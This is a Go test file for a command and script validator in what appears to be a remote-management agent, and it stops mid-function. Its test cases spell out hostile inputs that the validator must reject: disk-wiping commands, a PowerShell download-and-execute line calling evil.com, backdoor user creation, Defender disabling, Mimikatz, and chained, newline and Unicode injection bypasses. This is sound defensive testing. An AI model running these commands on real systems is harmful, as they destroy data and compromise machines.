package executor

import (
	"testing"
)

func TestValidateCommand_ValidCommands(t *testing.T) {
	tests := []struct {
		name    string
		command string
		cmdType string
		wantErr bool
	}{
		{
			name:    "Valid systeminfo",
			command: "systeminfo",
			cmdType: "cmd",
			wantErr: false,
		},
		{
			name:    "Valid PowerShell Get-Process",
			command: "Get-Process",
			cmdType: "powershell",
			wantErr: false,
		},
		{
			name:    "Valid ipconfig",
			command: "ipconfig /all",
			cmdType: "cmd",
			wantErr: false,
		},
		{
			name:    "Valid ps command",
			command: "ps aux",
			cmdType: "bash",
			wantErr: false,
		},
		{
			name:    "Valid netstat",
			command: "netstat -an",
			cmdType: "cmd",
			wantErr: false,
		},
		{
			name:    "Valid PowerShell with pipe",
			command: "Get-Process | Where-Object {$_.CPU -gt 10}",
			cmdType: "powershell",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, tt.cmdType)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateCommand_DangerousCommands(t *testing.T) {
	tests := []struct {
		name    string
		command string
		cmdType string
	}{
		{
			name:    "Dangerous rm -rf /",
			command: "rm -rf /",
			cmdType: "bash",
		},
		{
			name:    "Dangerous format",
			command: "format c:",
			cmdType: "cmd",
		},
		{
			name:    "Dangerous del with /s /q",
			command: "del /s /q c:\\",
			cmdType: "cmd",
		},
		{
			name:    "Dangerous Remove-Item recursive",
			command: "Remove-Item C:\\ -Recurse -Force",
			cmdType: "powershell",
		},
		{
			name:    "Dangerous Set-ExecutionPolicy",
			command: "Set-ExecutionPolicy Unrestricted",
			cmdType: "powershell",
		},
		{
			name:    "Dangerous Invoke-Expression with download",
			command: "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')",
			cmdType: "powershell",
		},
		{
			name:    "Dangerous useradd",
			command: "useradd hacker",
			cmdType: "bash",
		},
		{
			name:    "Dangerous passwd change",
			command: "echo 'password' | passwd root",
			cmdType: "bash",
		},
		{
			name:    "Dangerous fdisk",
			command: "fdisk /dev/sda",
			cmdType: "bash",
		},
		{
			name:    "Dangerous dd",
			command: "dd if=/dev/zero of=/dev/sda",
			cmdType: "bash",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, tt.cmdType)
			if err == nil {
				t.Errorf("ValidateCommand() expected error for dangerous command: %s", tt.command)
			}
		})
	}
}

func TestValidateCommand_CommandLength(t *testing.T) {
	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{
			name:    "Command within length limit",
			command: "systeminfo",
			wantErr: false,
		},
		{
			name:    "Command exceeds length limit",
			command: string(make([]byte, MaxCommandLength+1)),
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, "cmd")
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateCommand_EmptyCommand(t *testing.T) {
	err := ValidateCommand("", "cmd")
	if err == nil {
		t.Error("ValidateCommand() expected error for empty command")
	}

	err = ValidateCommand("   ", "cmd")
	if err == nil {
		t.Error("ValidateCommand() expected error for whitespace-only command")
	}
}

func TestValidateCommand_NullBytes(t *testing.T) {
	command := "systeminfo\x00 && echo hacked"
	err := ValidateCommand(command, "cmd")
	if err == nil {
		t.Error("ValidateCommand() expected error for command with null bytes")
	}
}

func TestValidateCommand_InvalidType(t *testing.T) {
	err := ValidateCommand("systeminfo", "invalid_type")
	if err == nil {
		t.Error("ValidateCommand() expected error for invalid command type")
	}
}

func TestValidateCommand_NotWhitelisted(t *testing.T) {
	// Test commands not in whitelist
	// Note: nc IS whitelisted (Linux/Unix Network), so use other non-whitelisted commands
	tests := []string{
		"arbitrary_command",
		"malware.exe",
		"backdoor -l -p 4444",
	}

	for _, cmd := range tests {
		err := ValidateCommand(cmd, "cmd")
		if err == nil {
			t.Errorf("ValidateCommand() expected error for non-whitelisted command: %s", cmd)
		}
	}
}

func TestValidateScript_ValidScripts(t *testing.T) {
	tests := []struct {
		name     string
		script   string
		language string
		wantErr  bool
	}{
		{
			name:     "Valid PowerShell script",
			script:   "Get-Process | Where-Object {$_.CPU -gt 10}",
			language: "powershell",
			wantErr:  false,
		},
		{
			name:     "Valid bash script",
			script:   "#!/bin/bash\necho 'Hello World'",
			language: "bash",
			wantErr:  false,
		},
		{
			name:     "Valid Python script",
			script:   "print('Hello World')",
			language: "python",
			wantErr:  false,
		},
		{
			name:     "Valid batch script",
			script:   "@echo off\necho Hello World",
			language: "bat",
			wantErr:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateScript(tt.script, tt.language)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateScript() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateScript_DangerousScripts(t *testing.T) {
	tests := []struct {
		name     string
		script   string
		language string
	}{
		{
			name:     "Dangerous ransomware pattern",
			script:   "Get-ChildItem -Recurse | ForEach-Object { Rename-Item $_.FullName ($_.FullName + '.encrypt') }",
			language: "powershell",
		},
		{
			name:     "Dangerous Remove-Item recursive",
			script:   "Remove-Item C:\\Users -Recurse -Force",
			language: "powershell",
		},
		{
			name:     "Dangerous del command",
			script:   "del /s /q C:\\*",
			language: "bat",
		},
		{
			name:     "Dangerous disable defender",
			script:   "Set-MpPreference -DisableRealtimeMonitoring $true",
			language: "powershell",
		},
		{
			name:     "Dangerous format command",
			script:   "format c: /q /y",
			language: "cmd",
		},
		{
			name:     "Dangerous mimikatz reference",
			script:   "Invoke-Mimikatz -Command privilege::debug",
			language: "powershell",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateScript(tt.script, tt.language)
			if err == nil {
				t.Errorf("ValidateScript() expected error for dangerous script: %s", tt.script)
			}
		})
	}
}

func TestValidateScript_ScriptSize(t *testing.T) {
	tests := []struct {
		name     string
		script   string
		language string
		wantErr  bool
	}{
		{
			name:     "Script within size limit",
			script:   "echo 'test'",
			language: "bash",
			wantErr:  false,
		},
		{
			name:     "Script exceeds size limit",
			script:   string(make([]byte, MaxScriptSize+1)),
			language: "bash",
			wantErr:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateScript(tt.script, tt.language)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateScript() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateScript_InvalidLanguage(t *testing.T) {
	err := ValidateScript("echo 'test'", "invalid_language")
	if err == nil {
		t.Error("ValidateScript() expected error for invalid language")
	}
}

func TestValidateScript_EmptyScript(t *testing.T) {
	err := ValidateScript("", "bash")
	if err == nil {
		t.Error("ValidateScript() expected error for empty script")
	}

	err = ValidateScript("   ", "bash")
	if err == nil {
		t.Error("ValidateScript() expected error for whitespace-only script")
	}
}

func TestValidateScript_NullBytes(t *testing.T) {
	script := "echo 'test'\x00 && echo 'hacked'"
	err := ValidateScript(script, "bash")
	if err == nil {
		t.Error("ValidateScript() expected error for script with null bytes")
	}
}

func TestExtractBaseCommand(t *testing.T) {
	tests := []struct {
		name    string
		command string
		cmdType string
		want    string
	}{
		{
			name:    "Simple command",
			command: "systeminfo",
			cmdType: "cmd",
			want:    "systeminfo",
		},
		{
			name:    "Command with arguments",
			command: "ipconfig /all",
			cmdType: "cmd",
			want:    "ipconfig",
		},
		{
			name:    "PowerShell cmdlet",
			command: "Get-Process -Name chrome",
			cmdType: "powershell",
			want:    "Get-Process",
		},
		{
			name:    "Command with pipe",
			command: "ps aux | grep chrome",
			cmdType: "bash",
			want:    "ps",
		},
		{
			name:    "Command with sudo",
			command: "sudo systemctl status",
			cmdType: "bash",
			want:    "systemctl",
		},
		{
			name:    "Command with path",
			command: "/usr/bin/ps aux",
			cmdType: "bash",
			want:    "ps",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := extractBaseCommand(tt.command, tt.cmdType)
			if got != tt.want {
				t.Errorf("extractBaseCommand() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestValidateCommand_ChainedCommands(t *testing.T) {
	tests := []struct {
		name    string
		command string
		cmdType string
		wantErr bool
	}{
		// Legitimate chained commands (all whitelisted)
		{
			name:    "Legitimate update chain with && (curl, move, copy, net)",
			command: `curl.exe -s -f -o "%TEMP%\sentinel-agent-update.exe" "https://example.com/update.exe" && move /Y "%TEMP%\old.exe" "%TEMP%\backup.exe" && copy /Y "%TEMP%\new.exe" "C:\Program Files\Sentinel\agent.exe" && net stop SentinelAgent`,
			cmdType: "cmd",
			wantErr: false,
		},
		{
			name:    "Pipe with whitelisted commands",
			command: `tasklist | find "sentinel"`,
			cmdType: "cmd",
			wantErr: false,
		},
		{
			name:    "Double ampersand with whitelisted commands",
			command: "hostname && systeminfo",
			cmdType: "cmd",
			wantErr: false,
		},
		{
			name:    "Semicolon-separated whitelisted commands",
			command: "hostname ; whoami ; date",
			cmdType: "bash",
			wantErr: false,
		},
		{
			name:    "Logical OR with whitelisted commands",
			command: "ping 8.8.8.8 || echo offline",
			cmdType: "cmd",
			wantErr: false,
		},
		{
			name:    "Background ampersand with whitelisted commands",
			command: "ps aux & ls -la",
			cmdType: "bash",
			wantErr: false,
		},
		// Attack: whitelisted first command, non-whitelisted chained command
		{
			name:    "ATTACK: tasklist && malware.exe",
			command: `tasklist && C:\temp\evil.exe`,
			cmdType: "cmd",
			wantErr: true,
		},
		{
			name:    "ATTACK: whitelisted | non-whitelisted",
			command: `tasklist | evil_program`,
			cmdType: "cmd",
			wantErr: true,
		},
		{
			name:    "ATTACK: whitelisted ; non-whitelisted",
			command: "hostname ; malware",
			cmdType: "cmd",
			wantErr: true,
		},
		{
			name:    "ATTACK: whitelisted || non-whitelisted",
			command: "hostname || evil_binary",
			cmdType: "cmd",
			wantErr: true,
		},
		{
			name:    "ATTACK: three commands, last non-whitelisted",
			command: "tasklist && hostname && evil_payload",
			cmdType: "cmd",
			wantErr: true,
		},
		{
			name:    "ATTACK: download and execute via chain",
			command: `tasklist && powershell -c "Invoke-WebRequest ..."`,
			cmdType: "cmd",
			wantErr: true,
		},
		// PowerShell chain validation
		{
			name:    "PowerShell pipe - all whitelisted",
			command: "Get-Process | Where-Object {$_.CPU -gt 10} | Sort-Object CPU",
			cmdType: "powershell",
			wantErr: false,
		},
		{
			name:    "PowerShell semicolon chain - all whitelisted",
			command: "Get-Process ; Get-Service",
			cmdType: "powershell",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, tt.cmdType)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestExtractAllBaseCommands(t *testing.T) {
	tests := []struct {
		name    string
		command string
		cmdType string
		want    []string
	}{
		{
			name:    "Single command",
			command: "systeminfo",
			cmdType: "cmd",
			want:    []string{"systeminfo"},
		},
		{
			name:    "Two commands with &&",
			command: "hostname && systeminfo",
			cmdType: "cmd",
			want:    []string{"hostname", "systeminfo"},
		},
		{
			name:    "Pipe chain",
			command: "tasklist | find \"sentinel\"",
			cmdType: "cmd",
			want:    []string{"tasklist", "find"},
		},
		{
			name:    "Mixed separators",
			command: "hostname && whoami ; date",
			cmdType: "cmd",
			want:    []string{"hostname", "whoami", "date"},
		},
		{
			name:    "Update chain with paths",
			command: `curl.exe -s -f -o "%TEMP%\update.exe" "https://example.com" && move /Y old new && net stop SentinelAgent`,
			cmdType: "cmd",
			want:    []string{"curl", "move", "net"},
		},
		{
			name:    "Command with sudo in chain",
			command: "sudo systemctl status && hostname",
			cmdType: "bash",
			want:    []string{"systemctl", "hostname"},
		},
		{
			name:    "PowerShell pipeline",
			command: "Get-Process | Where-Object {$_.CPU -gt 10}",
			cmdType: "powershell",
			want:    []string{"Get-Process", "Where-Object"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := extractAllBaseCommands(tt.command, tt.cmdType)
			if len(got) != len(tt.want) {
				t.Errorf("extractAllBaseCommands() returned %d commands %v, want %d commands %v", len(got), got, len(tt.want), tt.want)
				return
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("extractAllBaseCommands()[%d] = %v, want %v", i, got[i], tt.want[i])
				}
			}
		})
	}
}

// =============================================================================
// C-05 Comprehensive Chain Validation Tests
// =============================================================================
// These tests cover all 17 scenarios for the C-05 fix ensuring the validator
// checks ALL commands in a shell chain, not just the first.

func TestValidateCommand_C05_SingleWhitelistedPasses(t *testing.T) {
	// Scenario 1: Single whitelisted command passes
	cmds := []struct {
		name, command, cmdType string
	}{
		{"tasklist", "tasklist", "cmd"},
		{"ipconfig with args", "ipconfig /all", "cmd"},
		{"hostname", "hostname", "cmd"},
		{"ps aux", "ps aux", "bash"},
		{"ls -la", "ls -la", "bash"},
		{"Get-Process", "Get-Process", "powershell"},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateCommand(tt.command, tt.cmdType); err != nil {
				t.Errorf("single whitelisted command %q should pass, got: %v", tt.command, err)
			}
		})
	}
}

func TestValidateCommand_C05_SingleBlacklistedFails(t *testing.T) {
	// Scenario 2: Single blacklisted command fails
	cmds := []struct {
		name, command, cmdType string
	}{
		{"rm -rf /", "rm -rf /", "bash"},
		{"format c:", "format c:", "cmd"},
		{"useradd", "useradd hacker", "bash"},
		{"Invoke-Expression", "Invoke-Expression 'evil'", "powershell"},
		{"dd to device", "dd if=/dev/zero of=/dev/sda", "bash"},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateCommand(tt.command, tt.cmdType); err == nil {
				t.Errorf("blacklisted command %q must fail validation", tt.command)
			}
		})
	}
}

func TestValidateCommand_C05_FirstWhitelistedSecondNot(t *testing.T) {
	// Scenario 3: First whitelisted, second NOT whitelisted -> MUST FAIL
	cmds := []struct {
		name, command, cmdType string
	}{
		{"tasklist && evil_binary", "tasklist && evil_binary", "cmd"},
		{"ipconfig && malware.exe", "ipconfig && malware.exe", "cmd"},
		{"hostname && reverse_shell", "hostname && reverse_shell", "bash"},
		{"ls && backdoor", "ls && backdoor", "bash"},
		{"ps && cryptominer", "ps aux && cryptominer --mine", "bash"},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateCommand(tt.command, tt.cmdType); err == nil {
				t.Errorf("SECURITY: %q MUST FAIL — second command is not whitelisted", tt.command)
			}
		})
	}
}

func TestValidateCommand_C05_FirstNotWhitelisted(t *testing.T) {
	// Scenario 4: First command NOT whitelisted -> MUST FAIL
	cmds := []struct {
		name, command, cmdType string
	}{
		{"evil && tasklist", "evil && tasklist", "cmd"},
		{"backdoor && ipconfig", "backdoor && ipconfig", "cmd"},
		{"malware && hostname", "malware && hostname", "bash"},
		{"trojan ; ls", "trojan ; ls", "bash"},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateCommand(tt.command, tt.cmdType); err == nil {
				t.Errorf("SECURITY: %q MUST FAIL — first command is not whitelisted", tt.command)
			}
		})
	}
}

func TestValidateCommand_C05_AllWhitelistedChain(t *testing.T) {
	// Scenario 5: All commands whitelisted -> MUST PASS
	cmds := []struct {
		name, command, cmdType string
	}{
		{"tasklist && ipconfig && hostname", "tasklist && ipconfig && hostname", "cmd"},
		{"ls && ps && uptime", "ls && ps && uptime", "bash"},
		{"whoami && hostname && date", "whoami && hostname && date", "cmd"},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateCommand(tt.command, tt.cmdType); err != nil {
				t.Errorf("all-whitelisted chain %q should pass, got: %v", tt.command, err)
			}
		})
	}
}

func TestValidateCommand_C05_PipedAllWhitelisted(t *testing.T) {
	// Scenario 6: Piped commands all whitelisted -> MUST PASS
	cmds := []struct {
		name, command, cmdType string
	}{
		{"tasklist | find sentinel", `tasklist | find "sentinel"`, "cmd"},
		{"ps | grep chrome", "ps aux | grep chrome", "bash"},
		{"ls | sort | head", "ls -la | sort | head", "bash"},
		{"cat | grep | wc", "cat /var/log/syslog | grep error | wc -l", "bash"},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateCommand(tt.command, tt.cmdType); err != nil {
				t.Errorf("piped whitelisted commands %q should pass, got: %v", tt.command, err)
			}
		})
	}
}

func TestValidateCommand_C05_PipedNonWhitelisted(t *testing.T) {
	// Scenario 7: Piped command with non-whitelisted -> MUST FAIL
	cmds := []struct {
		name, command, cmdType string
	}{
		{"tasklist | evil_tool", "tasklist | evil_tool", "cmd"},
		{"ps | backdoor", "ps aux | backdoor --exfil", "bash"},
		{"ls | cryptominer", "ls -la | cryptominer", "bash"},
		{"evil_tool | tasklist", "evil_tool | tasklist", "cmd"},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateCommand(tt.command, tt.cmdType); err == nil {
				t.Errorf("SECURITY: %q MUST FAIL — piped command is not whitelisted", tt.command)
			}
		})
	}
}

func TestValidateCommand_C05_SemicolonChaining(t *testing.T) {
	// Scenario 8: Semicolon chaining with non-whitelisted -> MUST FAIL
	cmds := []struct {
		name, command, cmdType string
	}{
		{"tasklist; evil_binary", "tasklist; evil_binary", "cmd"},
		{"hostname; malware", "hostname; malware --payload", "bash"},
		{"ls; backdoor", "ls; backdoor", "bash"},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateCommand(tt.command, tt.cmdType); err == nil {
				t.Errorf("SECURITY: %q MUST FAIL — semicolon-chained command not whitelisted", tt.command)
			}
		})
	}
}

func TestValidateCommand_C05_BackgroundExecution(t *testing.T) {
	// Scenario 9: Background execution with non-whitelisted -> MUST FAIL
	cmds := []struct {
		name, command, cmdType string
	}{
		{"evil_binary & tasklist", "evil_binary & tasklist", "bash"},
		{"backdoor & ps", "backdoor & ps aux", "bash"},
		{"tasklist & evil_binary", "tasklist & evil_binary", "bash"},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateCommand(tt.command, tt.cmdType); err == nil {
				t.Errorf("SECURITY: %q MUST FAIL — background command not whitelisted", tt.command)
			}
		})
	}
}

func TestValidateCommand_C05_OrChaining(t *testing.T) {
	// Scenario 10: OR chaining with non-whitelisted -> MUST FAIL
	cmds := []struct {
		name, command, cmdType string
	}{
		{"tasklist || evil_binary", "tasklist || evil_binary", "cmd"},
		{"hostname || malware", "hostname || malware", "bash"},
		{"evil_binary || tasklist", "evil_binary || tasklist", "cmd"},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateCommand(tt.command, tt.cmdType); err == nil {
				t.Errorf("SECURITY: %q MUST FAIL — OR-chained command not whitelisted", tt.command)
			}
		})
	}
}

func TestValidateCommand_C05_LegitForceUpdateChain(t *testing.T) {
	// Scenario 11: The legitimate force-update chain — all commands whitelisted
	// curl.exe->curl, move, copy, net are all whitelisted
	command := `curl.exe -s -f -o "%TEMP%\sentinel-agent-update.exe" "https://server/api/agent/update/download?platform=windows&arch=amd64" && move /Y "%ProgramFiles%\SentinelRMM\sentinel-agent.exe" "%ProgramFiles%\SentinelRMM\sentinel-agent.old" && copy /Y "%TEMP%\sentinel-agent-update.exe" "%ProgramFiles%\SentinelRMM\sentinel-agent.exe" && net stop SentinelAgent`

	err := ValidateCommand(command, "cmd")
	if err != nil {
		t.Errorf("legitimate force-update chain should PASS, got: %v", err)
	}
}

func TestValidateCommand_C05_EmptyChainSegment(t *testing.T) {
	// Scenario 12: Empty chain segments — should handle gracefully (no panic)
	cmds := []struct {
		name, command, cmdType string
	}{
		{"double &&", "tasklist && && ipconfig", "cmd"},
		{"trailing &&", "tasklist &&", "cmd"},
		{"leading &&", "&& tasklist", "cmd"},
		{"empty semicolons", "; ; ;", "bash"},
		{"only separators", "&&", "cmd"},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			// Main assertion: no panic. Error is acceptable.
			err := ValidateCommand(tt.command, tt.cmdType)
			t.Logf("ValidateCommand(%q) = %v (no panic = OK)", tt.command, err)
		})
	}
}

func TestValidateCommand_C05_NestedSeparators(t *testing.T) {
	// Scenario 13: Nested separators / parenthesized groups
	cmds := []struct {
		name, command, cmdType string
		wantErr                bool
	}{
		{
			name:    "parenthesized OR - rejected (parentheses not stripped)",
			command: "tasklist && (ipconfig || hostname)",
			cmdType: "cmd",
			wantErr: true,
		},
		{
			name:    "parenthesized with evil command",
			command: "tasklist && (evil_binary || hostname)",
			cmdType: "cmd",
			wantErr: true,
		},
		{
			name:    "subshell - rejected (parentheses not stripped)",
			command: "(ls && ps) || hostname",
			cmdType: "bash",
			wantErr: true,
		},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, tt.cmdType)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand(%q) error = %v, wantErr %v", tt.command, err, tt.wantErr)
			}
		})
	}
}

func TestValidateCommand_C05_CommandsWithPaths(t *testing.T) {
	// Scenario 14: Commands with full paths — base name should be extracted correctly
	cmds := []struct {
		name, command, cmdType string
		wantErr                bool
	}{
		{
			name:    "two Linux path commands both whitelisted",
			command: "/usr/bin/ls && /usr/bin/cat /etc/hosts",
			cmdType: "bash",
			wantErr: false,
		},
		{
			name:    "Linux path chained with non-whitelisted",
			command: "/usr/bin/ls && /opt/evil/backdoor",
			cmdType: "bash",
			wantErr: true,
		},
		{
			name:    "Windows path commands both whitelisted",
			command: `C:\Windows\System32\ipconfig.exe && C:\Windows\System32\hostname.exe`,
			cmdType: "cmd",
			wantErr: false,
		},
		{
			name:    "Windows path with evil in chain",
			command: `C:\Windows\System32\ipconfig.exe && C:\temp\evil.exe`,
			cmdType: "cmd",
			wantErr: true,
		},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, tt.cmdType)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand(%q) error = %v, wantErr %v", tt.command, err, tt.wantErr)
			}
		})
	}
}

func TestValidateCommand_C05_PowerShellChaining(t *testing.T) {
	// Scenario 15: PowerShell chaining
	cmds := []struct {
		name, command, cmdType string
		wantErr                bool
	}{
		{
			name:    "two PS cmdlets semicolon",
			command: "Get-Process; Get-Service",
			cmdType: "powershell",
			wantErr: false,
		},
		{
			name:    "three PS cmdlets semicolon",
			command: "Get-Process; Get-Service; Get-ComputerInfo",
			cmdType: "powershell",
			wantErr: false,
		},
		{
			name:    "PS whitelisted then blacklisted",
			command: "Get-Process; Invoke-Expression 'evil'",
			cmdType: "powershell",
			wantErr: true,
		},
		{
			name:    "PS whitelisted then custom non-whitelisted",
			command: "Get-Process; Install-Backdoor",
			cmdType: "powershell",
			wantErr: true,
		},
		{
			name:    "PS pipeline all whitelisted",
			command: "Get-Process | Sort-Object CPU | Select-Object -First 10",
			cmdType: "powershell",
			wantErr: false,
		},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, tt.cmdType)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand(%q) error = %v, wantErr %v", tt.command, err, tt.wantErr)
			}
		})
	}
}

func TestValidateCommand_C05_ExcessiveChaining(t *testing.T) {
	// Scenario 16: Excessive chaining (>10 segments)
	// sanitizeArguments rejects commands with >10 special chars (& | ; > <)
	// 11 "&&" segments = 22 ampersands, well over the limit
	command := "tasklist && ipconfig && hostname && whoami && netstat && ping localhost && tracert localhost && nslookup localhost && route print && arp -a && systeminfo && ver"
	err := ValidateCommand(command, "cmd")
	// Should be rejected by sanitizeArguments for excessive special characters
	if err == nil {
		t.Log("WARNING: excessive chaining (12 segments) was allowed — consider adding a segment count limit")
	} else {
		t.Logf("Correctly rejected excessive chaining: %v", err)
	}
}

func TestValidateCommand_C05_UnicodeBypassAttempts(t *testing.T) {
	// Scenario 17: Unicode/special character bypass attempts
	cmds := []struct {
		name, command, cmdType string
	}{
		{
			name:    "BiDi override in chain",
			command: "tasklist && \u202Eevil_binary",
			cmdType: "cmd",
		},
		{
			name:    "null byte between chain segments",
			command: "tasklist\x00 && evil_binary",
			cmdType: "cmd",
		},
		{
			name:    "non-printable control char in chain",
			command: "tasklist && \x01evil_binary",
			cmdType: "cmd",
		},
		{
			name:    "zero-width space in command name",
			command: "tasklist && evil\u200Bbinary",
			cmdType: "cmd",
		},
		{
			name:    "homoglyph attack - Cyrillic a in tasklist",
			command: "tasklist && t\u0430sklist",
			cmdType: "cmd",
		},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateCommand(tt.command, tt.cmdType); err == nil {
				t.Errorf("SECURITY: unicode bypass %q MUST be blocked", tt.command)
			}
		})
	}
}

// TestValidateCommand_C05_MixedSeparators tests commands using multiple
// different separator types in the same command string.
func TestValidateCommand_C05_MixedSeparators(t *testing.T) {
	cmds := []struct {
		name, command, cmdType string
		wantErr                bool
	}{
		{
			name:    "pipe then && all whitelisted",
			command: `tasklist | find "sentinel" && ipconfig`,
			cmdType: "cmd",
			wantErr: false,
		},
		{
			name:    "pipe then && with evil",
			command: `tasklist | find "sentinel" && evil_binary`,
			cmdType: "cmd",
			wantErr: true,
		},
		{
			name:    "&& then pipe with evil",
			command: `tasklist && evil_binary | find "test"`,
			cmdType: "cmd",
			wantErr: true,
		},
		{
			name:    "semicolon then pipe all whitelisted",
			command: "hostname; ps aux | grep test",
			cmdType: "bash",
			wantErr: false,
		},
		{
			name:    "all separator types with evil",
			command: "tasklist && hostname | grep test ; evil_binary || echo done",
			cmdType: "bash",
			wantErr: true,
		},
	}
	for _, tt := range cmds {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, tt.cmdType)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand(%q) error = %v, wantErr %v", tt.command, err, tt.wantErr)
			}
		})
	}
}

// TestValidateCommand_NewlineBypass proves the AG-H newline whitelist bypass is
// closed: a command that hides a second command behind a newline must have that
// second line validated (and rejected) rather than silently executed.
func TestValidateCommand_NewlineBypass(t *testing.T) {
	tests := []struct {
		name    string
		command string
		cmdType string
		wantErr bool
	}{
		{
			name:    "ATTACK: whoami newline net user add",
			command: "whoami\nnet user hacker P@ss /add",
			cmdType: "cmd",
			wantErr: true,
		},
		{
			name:    "ATTACK: whoami CRLF net localgroup add",
			command: "whoami\r\nnet localgroup administrators hacker /add",
			cmdType: "cmd",
			wantErr: true,
		},
		{
			name:    "ATTACK: whitelisted newline non-whitelisted binary",
			command: "hostname\nevil_binary --payload",
			cmdType: "cmd",
			wantErr: true,
		},
		{
			name:    "ATTACK: newline New-LocalUser",
			command: "Get-Process\nNew-LocalUser -Name hacker",
			cmdType: "powershell",
			wantErr: true,
		},
		{
			name:    "Legitimate two whitelisted lines",
			command: "hostname\nwhoami",
			cmdType: "cmd",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, tt.cmdType)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand(%q) error = %v, wantErr %v", tt.command, err, tt.wantErr)
			}
		})
	}
}

func TestExtractAllBaseCommands_Newline(t *testing.T) {
	got := extractAllBaseCommands("whoami\nnet user hacker /add", "cmd")
	want := []string{"whoami", "net"}
	if len(got) != len(want) {
		t.Fatalf("extractAllBaseCommands() = %v, want %v", got, want)
	}
	for i := range got {
		if got[i] != want[i] {
			t.Errorf("extractAllBaseCommands()[%d] = %v, want %v", i, got[i], want[i])
		}
	}
}

// TestValidateScript_CommandWhitelist proves scripts are subject to a
// deny-by-default command policy (AG-H script) rather than blacklist-only.
func TestValidateScript_CommandWhitelist(t *testing.T) {
	tests := []struct {
		name     string
		script   string
		language string
		wantErr  bool
	}{
		{
			name:     "ATTACK: shell script invokes arbitrary binary",
			script:   "echo starting\nC:\\temp\\evil.exe --beacon",
			language: "cmd",
			wantErr:  true,
		},
		{
			name:     "ATTACK: powershell invokes non-whitelisted cmdlet",
			script:   "Get-Process\nInvoke-CustomBackdoor -Port 4444",
			language: "powershell",
			wantErr:  true,
		},
		{
			name:     "ATTACK: bash invokes unknown command",
			script:   "#!/bin/bash\nwhoami\n/opt/evil/miner --start",
			language: "bash",
			wantErr:  true,
		},
		{
			name:     "ATTACK: python os.system",
			script:   "import os\nos.system('rm -rf /')",
			language: "python",
			wantErr:  true,
		},
		{
			name:     "ATTACK: python subprocess",
			script:   "import subprocess\nsubprocess.run(['/bin/sh'])",
			language: "python",
			wantErr:  true,
		},
		{
			name:     "ATTACK: python exec primitive",
			script:   "exec(open('/tmp/x').read())",
			language: "python",
			wantErr:  true,
		},
		{
			name:     "Legitimate whitelisted shell script",
			script:   "@echo off\nhostname\nipconfig /all\nnet stop spooler",
			language: "bat",
			wantErr:  false,
		},
		{
			name:     "Legitimate whitelisted powershell script",
			script:   "$procs = Get-Process\nGet-Service | Where-Object {$_.Status -eq 'Running'}",
			language: "powershell",
			wantErr:  false,
		},
		{
			name:     "Legitimate benign python",
			script:   "x = 5\nprint('hello world')",
			language: "python",
			wantErr:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateScript(tt.script, tt.language)
			if (err != nil) != tt.wantErr {
